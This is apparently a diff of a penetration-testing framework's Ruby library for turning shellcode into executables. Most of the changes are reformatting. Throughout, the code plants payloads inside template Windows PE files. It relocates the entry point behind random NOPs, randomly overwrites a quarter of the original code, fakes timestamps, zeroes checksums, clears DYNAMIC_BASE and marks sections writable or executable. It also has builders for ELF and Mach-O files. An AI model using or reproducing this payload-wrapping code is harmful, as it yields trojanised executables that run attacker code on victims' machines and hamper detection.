@@ -1,132 +1,223 @@
 # -*- coding: binary -*-
 
 module Msf
-module Util
-#
-# The class provides methods for creating and encoding executable file
-# formats for various platforms. It is a replacement for the previous
-# code in Rex::Text
-#
+  module Util
+    #
+    # The class provides methods for creating and encoding executable file
+    # formats for various platforms. It is a replacement for the previous
+    # code in Rex::Text
+    #
 
-class EXE
+    class EXE
 
-require 'rex'
-require 'rex/peparsey'
-require 'rex/pescan'
-require 'rex/random_identifier'
-require 'rex/zip'
-require 'rex/powershell'
-require 'metasm'
-require 'digest/sha1'
-# Generates a default template
-  #
-  # @param  opts [Hash] The options hash
-  # @option opts [String] :template, the template type for the executable
-  # @option opts [String] :template_path, the path for the template
-  # @option opts [Bool] :fallback, If there are no options set, default options will be used
-  # @param  exe  [String] Template type. If undefined, will use the default.
-  # @param  path [String] Where you would like the template to be saved.
-  def self.set_template_default(opts, exe = nil, path = nil)
-    # If no path specified, use the default one
-    path ||= File.join(Msf::Config.data_directory, "templates")
+      require 'rex'
+      require 'rex/peparsey'
+      require 'rex/pescan'
+      require 'rex/random_identifier'
+      require 'rex/zip'
+      require 'rex/powershell'
+      require 'metasm'
+      require 'digest/sha1'
+      # Generates a default template
+      #
+      # @param  opts [Hash] The options hash
+      # @option opts [String] :template, the template type for the executable
+      # @option opts [String] :template_path, the path for the template
+      # @option opts [Bool] :fallback, If there are no options set, default options will be used
+      # @param  exe  [String] Template type. If undefined, will use the default.
+      # @param  path [String] Where you would like the template to be saved.
+      def self.set_template_default(opts, exe = nil, path = nil)
+        # If no path specified, use the default one
+        path ||= File.join(Msf::Config.data_directory, 'templates')
 
-    # If there's no default name, we must blow it up.
-    unless exe
-      raise RuntimeError, 'Ack! Msf::Util::EXE.set_template_default called ' +
-      'without default exe name!'
-    end
+        # If there's no default name, we must blow it up.
+        unless exe
+          raise 'Ack! Msf::Util::EXE.set_template_default called ' +
+                'without default exe name!'.to_s
+        end
 
-    # Use defaults only if nothing is specified
-    opts[:template_path] ||= path
-    opts[:template] ||= exe
+        # Use defaults only if nothing is specified
+        opts[:template_path] ||= path
+        opts[:template] ||= exe
 
-    # Only use the path when the filename contains no separators.
-    unless opts[:template].include?(File::SEPARATOR)
-      opts[:template] = File.join(opts[:template_path], opts[:template])
-    end
+        # Only use the path when the filename contains no separators.
+        unless opts[:template].include?(File::SEPARATOR)
+          opts[:template] = File.join(opts[:template_path], opts[:template])
+        end
 
-    # Check if it exists now
-    return if File.file?(opts[:template])
-    # If it failed, try the default...
-    if opts[:fallback]
-      default_template = File.join(path, exe)
-      if File.file?(default_template)
-        # Perhaps we should warn about falling back to the default?
-        opts.merge!({ :fellback => default_template })
-        opts[:template] = default_template
-      end
-    end
-  end
+        # Check if it exists now
+        return if File.file?(opts[:template])
 
-  # self.read_replace_script_template
-  #
-  # @param filename [String] Name of the file
-  # @param hash_sub [Hash]
-  def self.read_replace_script_template(filename, hash_sub)
-    template_pathname = File.join(Msf::Config.data_directory, "templates",
-                                  "scripts", filename)
-    template = ''
-    File.open(template_pathname, "rb") {|f| template = f.read}
-    template % hash_sub
-  end
-
-
-  # Generates a ZIP file.
-  #
-  # @param files [Array<Hash>] Items to compress. Each item is a hash that supports these options:
-  #  * :data - The content of the file.
-  #  * :fname - The file path in the ZIP file
-  #  * :comment - A comment
-  # @example Compressing two files, one in a folder called 'test'
-  #   Msf::Util::EXE.to_zip([{data: 'AAAA', fname: "file1.txt"}, {data: 'data', fname: 'test/file2.txt'}])
-  # @return [String]
-  def self.to_zip(files)
-    zip = Rex::Zip::Archive.new
-
-    files.each do |f|
-      data    = f[:data]
-      fname   = f[:fname]
-      comment = f[:comment] || ''
-      zip.add_file(fname, data, comment)
-    end
-
-    zip.pack
-  end
-
-  # Executable generators
-  #
-  # @param arch       [Array<String>] The architecture of the system (i.e :x86, :x64)
-  # @param plat       [String] The platform (i.e Linux, Windows, OSX)
-  # @param code       [String]
-  # @param opts       [Hash]   The options hash
-  # @param framework  [Msf::Framework]  The framework of you want to use
-  # @return           [String]
-  # @return           [NilClass]
-  def self.to_executable(framework, arch, plat, code = '', opts = {})
-    if elf? code or macho? code
-      return code
-    end
-
-    if arch.index(ARCH_X86)
-
-      if plat.index(Msf::Module::Platform::Windows)
-        return to_win32pe(framework, code, opts)
+        # If it failed, try the default...
+        if opts[:fallback]
+          default_template = File.join(path, exe)
+          if File.file?(default_template)
+            # Perhaps we should warn about falling back to the default?
+            opts.merge!({ fellback: default_template })
+            opts[:template] = default_template
+          end
+        end
       end
 
-      if plat.index(Msf::Module::Platform::Linux)
-        return to_linux_x86_elf(framework, code)
+      # self.read_replace_script_template
+      #
+      # @param filename [String] Name of the file
+      # @param hash_sub [Hash]
+      def self.read_replace_script_template(filename, hash_sub)
+        template_pathname = File.join(Msf::Config.data_directory, 'templates',
+                                      'scripts', filename)
+        template = ''
+        File.open(template_pathname, 'rb') { |f| template = f.read }
+        template % hash_sub
       end
 
-      if plat.index(Msf::Module::Platform::OSX)
-        return to_osx_x86_macho(framework, code)
+      # Generates a ZIP file.
+      #
+      # @param files [Array<Hash>] Items to compress. Each item is a hash that supports these options:
+      #  * :data - The content of the file.
+      #  * :fname - The file path in the ZIP file
+      #  * :comment - A comment
+      # @example Compressing two files, one in a folder called 'test'
+      #   Msf::Util::EXE.to_zip([{data: 'AAAA', fname: "file1.txt"}, {data: 'data', fname: 'test/file2.txt'}])
+      # @return [String]
+      def self.to_zip(files)
+        zip = Rex::Zip::Archive.new
+
+        files.each do |f|
+          data = f[:data]
+          fname = f[:fname]
+          comment = f[:comment] || ''
+          zip.add_file(fname, data, comment)
+        end
+
+        zip.pack
       end
 
-      if plat.index(Msf::Module::Platform::BSD)
-        return to_bsd_x86_elf(framework, code)
+      # Executable generators
+      #
+      # @param arch       [Array<String>] The architecture of the system (i.e :x86, :x64)
+      # @param plat       [String] The platform (i.e Linux, Windows, OSX)
+      # @param code       [String]
+      # @param opts       [Hash]   The options hash
+      # @param framework  [Msf::Framework]  The framework of you want to use
+      # @return           [String]
+      # @return           [NilClass]
+      def self.to_executable(framework, arch, plat, code = '', opts = {})
+        if elf?(code) || macho?(code)
+          return code
+        end
+
+        if arch.index(ARCH_X86)
+
+          if plat.index(Msf::Module::Platform::Windows)
+            return to_win32pe(framework, code, opts)
+          end
+
+          if plat.index(Msf::Module::Platform::Linux)
+            return to_linux_x86_elf(framework, code)
+          end
+
+          if plat.index(Msf::Module::Platform::OSX)
+            return to_osx_x86_macho(framework, code)
+          end
+
+          if plat.index(Msf::Module::Platform::BSD)
+            return to_bsd_x86_elf(framework, code)
+          end
+
+          if plat.index(Msf::Module::Platform::Solaris)
+            return to_solaris_x86_elf(framework, code)
+          end
+
+          # XXX: Add remaining x86 systems here
+        end
+
+        if arch.index(ARCH_X64)
+          if plat.index(Msf::Module::Platform::Windows)
+            return to_win64pe(framework, code, opts)
+          end
+
+          if plat.index(Msf::Module::Platform::Linux)
+            return to_linux_x64_elf(framework, code, opts)
+          end
+
+          if plat.index(Msf::Module::Platform::OSX)
+            return to_osx_x64_macho(framework, code)
+          end
+
+          if plat.index(Msf::Module::Platform::BSD)
+            return to_bsd_x64_elf(framework, code)
+          end
+        end
+
+        if arch.index(ARCH_ARMLE)
+          if plat.index(Msf::Module::Platform::OSX)
+            return to_osx_arm_macho(framework, code)
+          end
+
+          if plat.index(Msf::Module::Platform::Linux)
+            return to_linux_armle_elf(framework, code)
+          end
+
+          # XXX: Add remaining ARMLE systems here
+        end
+
+        if arch.index(ARCH_AARCH64)
+          if plat.index(Msf::Module::Platform::Linux)
+            return to_linux_aarch64_elf(framework, code)
+          end
+
+          if plat.index(Msf::Module::Platform::OSX)
+            return to_osx_aarch64_macho(framework, code)
+          end
+
+          # XXX: Add remaining AARCH64 systems here
+        end
+
+        if arch.index(ARCH_PPC) && plat.index(Msf::Module::Platform::OSX)
+          return to_osx_ppc_macho(framework, code)
+        end
+        # XXX: Add PPC OS X and Linux here
+
+        if arch.index(ARCH_MIPSLE) && plat.index(Msf::Module::Platform::Linux)
+          return to_linux_mipsle_elf(framework, code)
+        end
+        # XXX: Add remaining MIPSLE systems here
+
+        if arch.index(ARCH_MIPSBE) && plat.index(Msf::Module::Platform::Linux)
+          return to_linux_mipsbe_elf(framework, code)
+        end
+        # XXX: Add remaining MIPSLE systems here
+
+        if arch.index(ARCH_RISCV32LE) && plat.index(Msf::Module::Platform::Linux)
+          return to_linux_riscv32le_elf(framework, code)
+        end
+        # TODO: Add remaining RISCV32LE systems here
+
+        if arch.index(ARCH_RISCV64LE) && plat.index(Msf::Module::Platform::Linux)
+          return to_linux_riscv64le_elf(framework, code)
+        end
+
+        # TODO: Add remaining RISCV64LE systems here
+
+        nil
       end
 
-      if plat.index(Msf::Module::Platform::Solaris)
-        return to_solaris_x86_elf(framework, code)
+      # Clears the DYNAMIC_BASE flag for a Windows executable
+      #
+      # @param  exe  [String] The raw executable to be modified by the method
+      # @param  pe   [Rex::PeParsey::Pe] Use Rex::PeParsey::Pe.new_from_file
+      # @return      [String] the modified executable
+      def self.clear_dynamic_base(exe, pe)
+        c_bits = ('%32d' % pe.hdr.opt.DllCharacteristics.to_s(2)).split('').map(&:to_i).reverse
+        c_bits[6] = 0 # DYNAMIC_BASE
+        new_dllcharacteristics = c_bits.reverse.join.to_i(2)
+
+        # PE Header Pointer offset = 60d
+        # SizeOfOptionalHeader offset = 94h
+        dll_ch_offset = exe[60, 4].unpack('h4')[0].reverse.hex + 94
+        exe[dll_ch_offset, 2] = [new_dllcharacteristics].pack('v')
+        exe
       end
 
       # XXX: Add remaining x86 systems here
@@ -255,375 +346,357 @@ require 'digest/sha1'
       end
 
       # use
-      return self.to_win32pe_exe_sub(framework, code, opts)
+      self.to_win32pe_exe_sub(framework, code, opts)
     end
 
-    # Allow the user to specify their own EXE template
-    set_template_default(opts, "template_x86_windows.exe")
+        # Allow the user to specify their own EXE template
+        set_template_default(opts, 'template_x86_windows.exe')
 
-    # Copy the code to a new RWX segment to allow for self-modifying encoders
-    payload = win32_rwx_exec(code)
+        # Copy the code to a new RWX segment to allow for self-modifying encoders
+        payload = win32_rwx_exec(code)
 
-    # Create a new PE object and run through sanity checks
-    pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)
+        # Create a new PE object and run through sanity checks
+        pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)
 
-    #try to inject code into executable by adding a section without affecting executable behavior
-    if opts[:inject]
-      injector = Msf::Exe::SegmentInjector.new({
-          :payload  => code,
-          :template => opts[:template],
-          :arch     => :x86,
-          :secname  => opts[:secname]
-      })
-      return injector.generate_pe
-    end
-
-    text = nil
-    pe.sections.each {|sec| text = sec if sec.name == ".text"}
-
-    raise RuntimeError, "No .text section found in the template" unless text
-
-    unless text.contains_rva?(pe.hdr.opt.AddressOfEntryPoint)
-      raise RuntimeError, "The .text section does not contain an entry point"
-    end
-
-    p_length = payload.length + 256
-
-    # If the .text section is too small, append a new section instead
-    if text.size < p_length
-      appender = Msf::Exe::SegmentAppender.new({
-          :payload  => code,
-          :template => opts[:template],
-          :arch     => :x86,
-          :secname  => opts[:secname]
-      })
-      return appender.generate_pe
-    end
-
-    # Store some useful offsets
-    off_ent = pe.rva_to_file_offset(pe.hdr.opt.AddressOfEntryPoint)
-    off_beg = pe.rva_to_file_offset(text.base_rva)
-
-    # We need to make sure our injected code doesn't conflict with the
-    # the data directories stored in .text (import, export, etc)
-    mines = []
-    pe.hdr.opt['DataDirectory'].each do |dir|
-      next if dir.v['Size'] == 0
-      next unless text.contains_rva?(dir.v['VirtualAddress'])
-      delta = pe.rva_to_file_offset(dir.v['VirtualAddress']) - off_beg
-      mines << [delta, dir.v['Size']]
-    end
-
-    # Break the text segment into contiguous blocks
-    blocks = []
-    bidx   = 0
-    mines.sort{|a,b| a[0] <=> b[0]}.each do |mine|
-      bbeg = bidx
-      bend = mine[0]
-      blocks << [bidx, bend-bidx] if bbeg != bend
-      bidx = mine[0] + mine[1]
-    end
-
-    # Add the ending block
-    blocks << [bidx, text.size - bidx] if bidx < text.size - 1
-
-    # Find the largest contiguous block
-    blocks.sort!{|a,b| b[1]<=>a[1]}
-    block = blocks.first
-
-    # TODO: Allow the entry point in a different block
-    if payload.length + 256 >= block[1]
-      raise RuntimeError, "The largest block in .text does not have enough contiguous space (need:#{payload.length+257} found:#{block[1]})"
-    end
-
-    # Make a copy of the entire .text section
-    data = text.read(0,text.size)
-
-    # Pick a random offset to store the payload
-    poff = rand(block[1] - payload.length - 256)
-
-    # Flip a coin to determine if EP is before or after
-    eloc = rand(2)
-    eidx = nil
-
-    # Pad the entry point with random nops
-    entry = generate_nops(framework, [ARCH_X86], rand(200) + 51)
-
-    # Pick an offset to store the new entry point
-    if eloc == 0 # place the entry point before the payload
-      poff += 256
-      eidx = rand(poff-(entry.length + 5))
-    else          # place the entry pointer after the payload
-      poff -= [256, poff].min
-      eidx = rand(block[1] - (poff + payload.length + 256)) + poff + payload.length
-    end
-
-    # Relative jump from the end of the nops to the payload
-    entry += "\xe9" + [poff - (eidx + entry.length + 5)].pack('V')
-
-    # Mangle 25% of the original executable
-    1.upto(block[1] / 4) do
-      data[ block[0] + rand(block[1]), 1] = [rand(0x100)].pack("C")
-    end
-
-    # Patch the payload and the new entry point into the .text
-    data[block[0] + poff, payload.length] = payload
-    data[block[0] + eidx, entry.length]   = entry
-
-    # Create the modified version of the input executable
-    exe = ''
-    File.open(opts[:template], 'rb') {|fd| exe = fd.read(fd.stat.size)}
-
-    a = [text.base_rva + block.first + eidx].pack("V")
-    exe[exe.index([pe.hdr.opt.AddressOfEntryPoint].pack('V')), 4] = a
-    exe[off_beg, data.length] = data
-
-    tds = pe.hdr.file.TimeDateStamp
-    exe[exe.index([tds].pack('V')), 4] = [tds - rand(0x1000000)].pack("V")
-
-    cks = pe.hdr.opt.CheckSum
-    unless cks == 0
-      exe[exe.index([cks].pack('V')), 4] = [0].pack("V")
-    end
-
-    exe = clear_dynamic_base(exe, pe)
-    pe.close
-
-    exe
-  end
-
-  # self.to_winpe_only
-  #
-  # @param framework  [Msf::Framework]  The framework of you want to use
-  # @param code       [String]
-  # @param opts       [Hash]
-  # @param arch       [String] Default is "x86"
-  def self.to_winpe_only(framework, code, opts = {}, arch=ARCH_X86)
-
-    # Allow the user to specify their own EXE template
-    set_template_default(opts, "template_#{arch}_windows.exe")
-
-    pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)
-
-    exe = ''
-    File.open(opts[:template], 'rb') {|fd| exe = fd.read(fd.stat.size)}
-
-    pe_header_size = 0x18
-    entryPoint_offset = 0x28
-    section_size = 0x28
-    characteristics_offset = 0x24
-    virtualAddress_offset = 0x0c
-    sizeOfRawData_offset = 0x10
-
-    sections_table_offset =
-      pe._dos_header.v['e_lfanew'] +
-      pe._file_header.v['SizeOfOptionalHeader'] +
-      pe_header_size
-
-    sections_table_characteristics_offset = sections_table_offset + characteristics_offset
-
-    sections_header = []
-    pe._file_header.v['NumberOfSections'].times do |i|
-      section_offset = sections_table_offset + (i * section_size)
-      sections_header << [
-        sections_table_characteristics_offset + (i * section_size),
-        exe[section_offset,section_size]
-      ]
-    end
-
-    addressOfEntryPoint = pe.hdr.opt.AddressOfEntryPoint
-
-    # look for section with entry point
-    sections_header.each do |sec|
-      virtualAddress = sec[1][virtualAddress_offset,0x4].unpack('V')[0]
-      sizeOfRawData = sec[1][sizeOfRawData_offset,0x4].unpack('V')[0]
-      characteristics = sec[1][characteristics_offset,0x4].unpack('V')[0]
-
-      if (virtualAddress...virtualAddress+sizeOfRawData).include?(addressOfEntryPoint)
-        importsTable = pe.hdr.opt.DataDirectory[8..(8+4)].unpack('V')[0]
-        if (importsTable - addressOfEntryPoint) < code.length
-          #shift original entry point to prevent tables overwriting
-          addressOfEntryPoint = importsTable - code.length + 4
-
-          entry_point_offset = pe._dos_header.v['e_lfanew'] + entryPoint_offset
-          exe[entry_point_offset,4] = [addressOfEntryPoint].pack('V')
+        # try to inject code into executable by adding a section without affecting executable behavior
+        if opts[:inject]
+          injector = Msf::Exe::SegmentInjector.new({
+            payload: code,
+            template: opts[:template],
+            arch: :x86,
+            secname: opts[:secname]
+          })
+          return injector.generate_pe
         end
-        # put this section writable
-        characteristics |= 0x8000_0000
-        newcharacteristics = [characteristics].pack('V')
-        exe[sec[0],newcharacteristics.length] = newcharacteristics
-      end
-    end
 
-    # put the shellcode at the entry point, overwriting template
-    entryPoint_file_offset = pe.rva_to_file_offset(addressOfEntryPoint)
-    exe[entryPoint_file_offset,code.length] = code
-    exe = clear_dynamic_base(exe, pe)
-    exe
-  end
+        text = nil
+        pe.sections.each { |sec| text = sec if sec.name == '.text' }
 
-  # self.to_win32pe_old
-  #
-  # @param framework  [Msf::Framework]  The framework of you want to use
-  # @param  code      [String]
-  # @param  opts      [Hash]
-  def self.to_win32pe_old(framework, code, opts = {})
+        raise 'No .text section found in the template' unless text
 
-    payload = code.dup
-    # Allow the user to specify their own EXE template
-    set_template_default(opts, "template_x86_windows_old.exe")
-
-    pe = ''
-    File.open(opts[:template], "rb") {|fd| pe = fd.read(fd.stat.size)}
-
-    if payload.length <= 2048
-      payload << Rex::Text.rand_text(2048-payload.length)
-    else
-      raise RuntimeError, "The EXE generator now has a max size of 2048 " +
-                          "bytes, please fix the calling module"
-    end
-
-    bo = pe.index('PAYLOAD:')
-    unless bo
-      raise RuntimeError, "Invalid Win32 PE OLD EXE template: missing \"PAYLOAD:\" tag"
-    end
-    pe[bo, payload.length] = payload
-
-    pe[136, 4] = [rand(0x100000000)].pack('V')
-
-    ci = pe.index("\x31\xc9" * 160)
-    unless ci
-      raise RuntimeError, "Invalid Win32 PE OLD EXE template: missing first \"\\x31\\xc9\""
-    end
-    cd = pe.index("\x31\xc9" * 160, ci + 320)
-    unless cd
-      raise RuntimeError, "Invalid Win32 PE OLD EXE template: missing second \"\\x31\\xc9\""
-    end
-    rc = pe[ci+320, cd-ci-320]
-
-    # 640 + rc.length bytes of room to store an encoded rc at offset ci
-    enc = encode_stub(framework, [ARCH_X86], rc, ::Msf::Module::PlatformList.win32)
-    lft = 640+rc.length - enc.length
-
-    buf = enc + Rex::Text.rand_text(640+rc.length - enc.length)
-    pe[ci, buf.length] = buf
-
-    # Make the data section executable
-    xi = pe.index([0xc0300040].pack('V'))
-    pe[xi,4] = [0xe0300020].pack('V')
-
-    # Add a couple random bytes for fun
-    pe << Rex::Text.rand_text(rand(64)+4)
-    pe
-  end
-
-
-  # Splits a string into a number of assembly push operations
-  #
-  # @param string [String] String to be used
-  # @return       [String] null terminated string as assembly push ops
-  def self.string_to_pushes(string)
-    str = string.dup
-    # Align string to 4 bytes
-    rem = (str.length) % 4
-    if rem > 0
-      str << "\x00" * (4 - rem)
-      pushes = ''
-    else
-      pushes = "h\x00\x00\x00\x00"
-    end
-    # string is now 4 bytes aligned with null byte
-
-    # push string to stack, starting at the back
-    while str.length > 0
-      four = 'h'+str.slice!(-4,4)
-      pushes << four
-    end
-
-    pushes
-  end
-
-  # Converts a raw AArch64 payload into a PE executable.
-  #
-  # @param framework [Msf::Framework] The framework instance.
-  # @param code [String] The raw AArch64 shellcode.
-  # @param opts [Hash] The options hash.
-  # @option opts [String] :template The path to a custom PE template.
-  # @return [String] The generated PE executable as a binary string.
-  def self.to_winaarch64pe(framework, code, opts = {})
-    # Use the standard template if not specified by the user.
-    # This helper finds the full path and stores it in opts[:template].
-    set_template_default(opts, 'template_aarch64_windows.exe')
-
-    # Read the template directly from the path now stored in the options.
-    pe = File.read(opts[:template], mode: 'rb')
-
-    # Find the tag and inject the payload
-    bo = find_payload_tag(pe, 'Invalid Windows AArch64 template: missing "PAYLOAD:" tag')
-    pe[bo, code.length] = code.dup
-    pe
-  end
-
-  # self.exe_sub_method
-  #
-  # @param  code [String]
-  # @param  opts [Hash]
-  # @option opts [Symbol] :exe_type
-  # @option opts [String] :service_exe
-  # @option opts [Boolean] :sub_method
-  # @return      [String]
-  def self.exe_sub_method(code,opts ={})
-    pe = self.get_file_contents(opts[:template])
-
-    case opts[:exe_type]
-    when :service_exe
-      opts[:exe_max_sub_length] ||= 8192
-      name = opts[:servicename]
-      if name
-        bo = pe.index('SERVICENAME')
-        unless bo
-          raise RuntimeError, "Invalid PE Service EXE template: missing \"SERVICENAME\" tag"
+        unless text.contains_rva?(pe.hdr.opt.AddressOfEntryPoint)
+          raise 'The .text section does not contain an entry point'
         end
-        pe[bo, 11] = [name].pack('a11')
+
+        p_length = payload.length + 256
+
+        # If the .text section is too small, append a new section instead
+        if text.size < p_length
+          appender = Msf::Exe::SegmentAppender.new({
+            payload: code,
+            template: opts[:template],
+            arch: :x86,
+            secname: opts[:secname]
+          })
+          return appender.generate_pe
+        end
+
+        # Store some useful offsets
+        pe.rva_to_file_offset(pe.hdr.opt.AddressOfEntryPoint)
+        off_beg = pe.rva_to_file_offset(text.base_rva)
+
+        # We need to make sure our injected code doesn't conflict with the
+        # the data directories stored in .text (import, export, etc)
+        mines = []
+        pe.hdr.opt['DataDirectory'].each do |dir|
+          next if dir.v['Size'] == 0
+          next unless text.contains_rva?(dir.v['VirtualAddress'])
+
+          delta = pe.rva_to_file_offset(dir.v['VirtualAddress']) - off_beg
+          mines << [delta, dir.v['Size']]
+        end
+
+        # Break the text segment into contiguous blocks
+        blocks = []
+        bidx = 0
+        mines.sort { |a, b| a[0] <=> b[0] }.each do |mine|
+          bbeg = bidx
+          bend = mine[0]
+          blocks << [bidx, bend - bidx] if bbeg != bend
+          bidx = mine[0] + mine[1]
+        end
+
+        # Add the ending block
+        blocks << [bidx, text.size - bidx] if bidx < text.size - 1
+
+        # Find the largest contiguous block
+        blocks.sort! { |a, b| b[1] <=> a[1] }
+        block = blocks.first
+
+        # TODO: Allow the entry point in a different block
+        if payload.length + 256 >= block[1]
+          raise "The largest block in .text does not have enough contiguous space (need:#{payload.length + 257} found:#{block[1]})"
+        end
+
+        # Make a copy of the entire .text section
+        data = text.read(0, text.size)
+
+        # Pick a random offset to store the payload
+        poff = rand(block[1] - payload.length - 256)
+
+        # Flip a coin to determine if EP is before or after
+        eloc = rand(2)
+        eidx = nil
+
+        # Pad the entry point with random nops
+        entry = generate_nops(framework, [ARCH_X86], rand(51..250))
+
+        # Pick an offset to store the new entry point
+        if eloc == 0 # place the entry point before the payload
+          poff += 256
+          eidx = rand(poff - (entry.length + 5))
+        else # place the entry pointer after the payload
+          poff -= [256, poff].min
+          eidx = rand(block[1] - (poff + payload.length + 256)) + poff + payload.length
+        end
+
+        # Relative jump from the end of the nops to the payload
+        entry += "\xe9" + [poff - (eidx + entry.length + 5)].pack('V')
+
+        # Mangle 25% of the original executable
+        1.upto(block[1] / 4) do
+          data[block[0] + rand(block[1]), 1] = [rand(0x100)].pack('C')
+        end
+
+        # Patch the payload and the new entry point into the .text
+        data[block[0] + poff, payload.length] = payload
+        data[block[0] + eidx, entry.length] = entry
+
+        # Create the modified version of the input executable
+        exe = ''
+        File.open(opts[:template], 'rb') { |fd| exe = fd.read(fd.stat.size) }
+
+        a = [text.base_rva + block.first + eidx].pack('V')
+        exe[exe.index([pe.hdr.opt.AddressOfEntryPoint].pack('V')), 4] = a
+        exe[off_beg, data.length] = data
+
+        tds = pe.hdr.file.TimeDateStamp
+        exe[exe.index([tds].pack('V')), 4] = [tds - rand(0x1000000)].pack('V')
+
+        cks = pe.hdr.opt.CheckSum
+        unless cks == 0
+          exe[exe.index([cks].pack('V')), 4] = [0].pack('V')
+        end
+
+        exe = clear_dynamic_base(exe, pe)
+        pe.close
+
+        exe
       end
-      pe[136, 4] = [rand(0x100000000)].pack('V') unless opts[:sub_method]
-    when :dll
-      opts[:exe_max_sub_length] ||= 4096
-    when :exe_sub
-      opts[:exe_max_sub_length] ||= 4096
-    end
 
-    bo = self.find_payload_tag(pe, "Invalid PE EXE subst template: missing \"PAYLOAD:\" tag")
+      # self.to_winpe_only
+      #
+      # @param framework  [Msf::Framework]  The framework of you want to use
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @param arch       [String] Default is "x86"
+      def self.to_winpe_only(framework, code, opts = {}, arch = ARCH_X86)
+        # Allow the user to specify their own EXE template
+        set_template_default(opts, "template_#{arch}_windows.exe")
 
-    if code.length <= opts.fetch(:exe_max_sub_length)
-      pe[bo, code.length] = [code].pack("a*")
-    else
-      raise RuntimeError, "The EXE generator now has a max size of " +
-                          "#{opts[:exe_max_sub_length]} bytes, please fix the calling module"
-    end
+        pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)
 
-    if opts[:exe_type] == :dll
-      mt = pe.index('MUTEX!!!')
-      pe[mt,8] = Rex::Text.rand_text_alpha(8) if mt
-      %w{ Local\Semaphore:Default Local\Event:Default }.each do |name|
-        offset = pe.index(name)
-        pe[offset,26] = "Local\\#{Rex::Text.rand_text_alphanumeric(20)}" if offset
+        exe = ''
+        File.open(opts[:template], 'rb') { |fd| exe = fd.read(fd.stat.size) }
+
+        pe_header_size = 0x18
+        entryPoint_offset = 0x28
+        section_size = 0x28
+        characteristics_offset = 0x24
+        virtualAddress_offset = 0x0c
+        sizeOfRawData_offset = 0x10
+
+        sections_table_offset =
+          pe._dos_header.v['e_lfanew'] +
+          pe._file_header.v['SizeOfOptionalHeader'] +
+          pe_header_size
+
+        sections_table_characteristics_offset = sections_table_offset + characteristics_offset
+
+        sections_header = []
+        pe._file_header.v['NumberOfSections'].times do |i|
+          section_offset = sections_table_offset + (i * section_size)
+          sections_header << [
+            sections_table_characteristics_offset + (i * section_size),
+            exe[section_offset, section_size]
+          ]
+        end
+
+        addressOfEntryPoint = pe.hdr.opt.AddressOfEntryPoint
+
+        # look for section with entry point
+        sections_header.each do |sec|
+          virtualAddress = sec[1][virtualAddress_offset, 0x4].unpack('V')[0]
+          sizeOfRawData = sec[1][sizeOfRawData_offset, 0x4].unpack('V')[0]
+          characteristics = sec[1][characteristics_offset, 0x4].unpack('V')[0]
+
+          next unless (virtualAddress...virtualAddress + sizeOfRawData).include?(addressOfEntryPoint)
+
+          importsTable = pe.hdr.opt.DataDirectory[8..(8 + 4)].unpack('V')[0]
+          if (importsTable - addressOfEntryPoint) < code.length
+            # shift original entry point to prevent tables overwriting
+            addressOfEntryPoint = importsTable - code.length + 4
+
+            entry_point_offset = pe._dos_header.v['e_lfanew'] + entryPoint_offset
+            exe[entry_point_offset, 4] = [addressOfEntryPoint].pack('V')
+          end
+          # put this section writable
+          characteristics |= 0x8000_0000
+          newcharacteristics = [characteristics].pack('V')
+          exe[sec[0], newcharacteristics.length] = newcharacteristics
+        end
+
+        # put the shellcode at the entry point, overwriting template
+        entryPoint_file_offset = pe.rva_to_file_offset(addressOfEntryPoint)
+        exe[entryPoint_file_offset, code.length] = code
+        exe = clear_dynamic_base(exe, pe)
+        exe
       end
 
-      if opts[:dll_exitprocess]
-        exit_thread = "\x45\x78\x69\x74\x54\x68\x72\x65\x61\x64\x00"
-        exit_process = "\x45\x78\x69\x74\x50\x72\x6F\x63\x65\x73\x73"
-        et_index =  pe.index(exit_thread)
-        if et_index
-          pe[et_index,exit_process.length] = exit_process
+      # self.to_win32pe_old
+      #
+      # @param framework  [Msf::Framework]  The framework of you want to use
+      # @param  code      [String]
+      # @param  opts      [Hash]
+      def self.to_win32pe_old(framework, code, opts = {})
+        payload = code.dup
+        # Allow the user to specify their own EXE template
+        set_template_default(opts, 'template_x86_windows_old.exe')
+
+        pe = ''
+        File.open(opts[:template], 'rb') { |fd| pe = fd.read(fd.stat.size) }
+
+        if payload.length <= 2048
+          payload << Rex::Text.rand_text(2048 - payload.length)
         else
-          raise RuntimeError, "Unable to find and replace ExitThread in the DLL."
+          raise 'The EXE generator now has a max size of 2048 ' +
+                'bytes, please fix the calling module'.to_s
         end
-      end
-    end
 
-    pe
-  end
+        bo = pe.index('PAYLOAD:')
+        unless bo
+          raise 'Invalid Win32 PE OLD EXE template: missing "PAYLOAD:" tag'
+        end
+
+        pe[bo, payload.length] = payload
+
+        pe[136, 4] = [rand(0x100000000)].pack('V')
+
+        ci = pe.index("\x31\xc9" * 160)
+        unless ci
+          raise 'Invalid Win32 PE OLD EXE template: missing first "\\x31\\xc9"'
+        end
+
+        cd = pe.index("\x31\xc9" * 160, ci + 320)
+        unless cd
+          raise 'Invalid Win32 PE OLD EXE template: missing second "\\x31\\xc9"'
+        end
+
+        rc = pe[ci + 320, cd - ci - 320]
+
+        # 640 + rc.length bytes of room to store an encoded rc at offset ci
+        enc = encode_stub(framework, [ARCH_X86], rc, ::Msf::Module::PlatformList.win32)
+        rc.length
+        enc.length
+
+        buf = enc + Rex::Text.rand_text(640 + rc.length - enc.length)
+        pe[ci, buf.length] = buf
+
+        # Make the data section executable
+        xi = pe.index([0xc0300040].pack('V'))
+        pe[xi, 4] = [0xe0300020].pack('V')
+
+        # Add a couple random bytes for fun
+        pe << Rex::Text.rand_text(rand(4..67))
+        pe
+      end
+
+      # Splits a string into a number of assembly push operations
+      #
+      # @param string [String] String to be used
+      # @return       [String] null terminated string as assembly push ops
+      def self.string_to_pushes(string)
+        str = string.dup
+        # Align string to 4 bytes
+        rem = str.length % 4
+        if rem > 0
+          str << "\x00" * (4 - rem)
+          pushes = ''
+        else
+          pushes = "h\x00\x00\x00\x00"
+        end
+        # string is now 4 bytes aligned with null byte
+
+        # push string to stack, starting at the back
+        until str.empty?
+          four = 'h' + str.slice!(-4, 4)
+          pushes << four
+        end
+
+        pushes
+      end
+
+      # self.exe_sub_method
+      #
+      # @param  code [String]
+      # @param  opts [Hash]
+      # @option opts [Symbol] :exe_type
+      # @option opts [String] :service_exe
+      # @option opts [Boolean] :sub_method
+      # @return      [String]
+      def self.exe_sub_method(code, opts = {})
